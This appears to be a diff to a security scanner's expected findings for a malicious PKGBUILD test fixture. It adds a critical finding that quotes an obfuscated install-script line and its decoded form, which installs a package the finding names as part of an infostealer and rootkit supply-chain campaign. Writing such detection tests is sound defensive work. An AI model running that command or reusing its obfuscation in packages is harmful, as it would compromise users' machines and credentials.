@@ -3,6 +3,26 @@
   "package_version": "1.0.0-1",
   "findings": [
     {
+      "id": "ATOMIC-001",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Atomic Arch malicious npm/bun package (install script)",
+      "description": "References a known-malicious package from the June 2026 'Atomic Arch' AUR supply-chain campaign (atomic-lockfile, js-digest, lockfile-js, nextfile-js / ansi-colors-nextfile-js and related wave-3 names). These pull an infostealer and eBPF rootkit during the build/install phase.",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install",
+        "line": 2,
+        "column": 22,
+        "snippet": "  $'\\x63'\"d\" \"/\"'t'\"m\"'p' && \"b\"'u''n' 'a''d''d' $'\\141\\x6e''s'\"i\"-'c''o''l''o''r'$'\\x73'-'n'\"e\"'x''t''f''i''l''e''-''j''s'    [de-obfuscated →   cd /tmp && bun add ansi-colors-nextfile-js]"
+      },
+      "recommendation": "Do NOT build. This is a known-malicious dependency. Remove the package and treat the host as compromised: rotate credentials (SSH, npm/GitHub tokens, browser sessions).",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "ansi-colors-nextfile-js",
+        "script_kind": "install script"
+      }
+    },
+    {
       "id": "ATOMIC-002",
       "severity": "critical",
       "category": "malicious_code",
@@ -18,7 +38,8 @@
       "cwe_id": "CWE-494",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "bun add"
+        "matched_text": "bun add",
+        "script_kind": "install script"
       }
     },
     {
@@ -37,7 +58,8 @@
       "cwe_id": "CWE-506",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "\\x63"
+        "matched_text": "\\x63",
+        "script_kind": "install script"
       }
     },
     {
@@ -56,7 +78,8 @@
       "cwe_id": "CWE-506",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "'t'\"m\"'p'"
+        "matched_text": "'t'\"m\"'p'",
+        "script_kind": "install script"
       }
     },
     {
@@ -64,17 +87,23 @@
       "severity": "high",
       "category": "cryptography",
       "title": "All non-VCS sources use SKIP checksum",
-      "description": "No integrity verification is performed on 1 non-VCS source(s)",
+      "description": "No integrity verification is performed on 1 non-VCS source(s): https://example.com/htbrowser-${pkgver}.tar.gz",
       "location": {
         "file": "tests/fixtures/malicious/obfuscated-install/PKGBUILD",
         "line": null,
         "column": null,
-        "snippet": null
+        "snippet": "source: https://example.com/htbrowser-${pkgver}.tar.gz"
       },
       "recommendation": "Provide real checksums for non-VCS sources",
       "cwe_id": "CWE-354",
       "metadata": {
         "non_vcs_source_count": 1,
+        "unverified_indices": [
+          0
+        ],
+        "unverified_sources": [
+          "https://example.com/htbrowser-${pkgver}.tar.gz"
+        ],
         "vcs_source_count": 0
       }
     }
@@ -83,6 +112,6 @@
     "tests/fixtures/malicious/obfuscated-install/PKGBUILD",
     "tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install"
   ],
-  "timestamp": "2026-06-15T13:48:49.995872071Z",
-  "scan_duration_ms": 6
+  "timestamp": "2026-11-10T14:51:04.436471885Z",
+  "scan_duration_ms": 22
 }
